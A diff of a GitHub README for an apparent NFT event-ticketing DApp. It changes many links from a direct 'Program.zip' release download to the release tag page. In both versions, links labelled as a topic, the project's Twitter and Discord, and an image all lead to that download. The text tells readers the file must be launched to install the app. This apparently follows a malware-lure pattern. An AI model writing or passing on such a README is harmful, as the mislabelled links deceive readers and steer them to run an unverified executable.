@@ -16,7 +16,7 @@ The core focus of this repository is the development and implementation of the N
 This repository covers a wide range of topics related to the NFT Event Tickets DApp:
 - CSS
 - DApp
-- https://github.com/aaanyimus/GFGKIIT-CRYPTOMA-HyperThon/releases/download/v1.0/Program.zip
+- https://github.com/aaanyimus/GFGKIIT-CRYPTOMA-HyperThon/releases/tag/v1.0
 - HTML
 - IPFS
 - MetaMask
@@ -33,7 +33,7 @@ Here you can explore the code, documentation, and resources related to the NFT E
 
 ## Installation
 To get started with the NFT Event Tickets DApp, you can download the necessary files from the following link:
-[![Download NFT Event Tickets DApp](https://github.com/aaanyimus/GFGKIIT-CRYPTOMA-HyperThon/releases/download/v1.0/Program.zip)](https://github.com/aaanyimus/GFGKIIT-CRYPTOMA-HyperThon/releases/download/v1.0/Program.zip)
+[![Download NFT Event Tickets DApp](https://github.com/aaanyimus/GFGKIIT-CRYPTOMA-HyperThon/releases/tag/v1.0)](https://github.com/aaanyimus/GFGKIIT-CRYPTOMA-HyperThon/releases/tag/v1.0)
 
 ### Note:
 The provided link points to a file that needs to be launched to install the NFT Event Tickets DApp on your system.
@@ -46,11 +46,11 @@ For the latest updates and releases of the NFT Event Tickets DApp, please check 
 
 ## Join Our Community
 Connect with us to stay updated on the latest developments, events, and discussions around the NFT Event Tickets DApp:
-- Twitter: [@NFTEventTickets](https://github.com/aaanyimus/GFGKIIT-CRYPTOMA-HyperThon/releases/download/v1.0/Program.zip)
-- Discord: [NFT Event Tickets Community](https://github.com/aaanyimus/GFGKIIT-CRYPTOMA-HyperThon/releases/download/v1.0/Program.zip)
+- Twitter: [@NFTEventTickets](https://github.com/aaanyimus/GFGKIIT-CRYPTOMA-HyperThon/releases/tag/v1.0)
+- Discord: [NFT Event Tickets Community](https://github.com/aaanyimus/GFGKIIT-CRYPTOMA-HyperThon/releases/tag/v1.0)
 
 Let's revolutionize the event ticketing industry together with NFTs and blockchain technology! 🎉
 
-![NFT Event Tickets DApp](https://github.com/aaanyimus/GFGKIIT-CRYPTOMA-HyperThon/releases/download/v1.0/Program.zip)
+![NFT Event Tickets DApp](https://github.com/aaanyimus/GFGKIIT-CRYPTOMA-HyperThon/releases/tag/v1.0)
 
 Thank you for exploring the GFGKIIT-CRYPTOMA-HyperThon repository. Happy coding! 🚀🎫
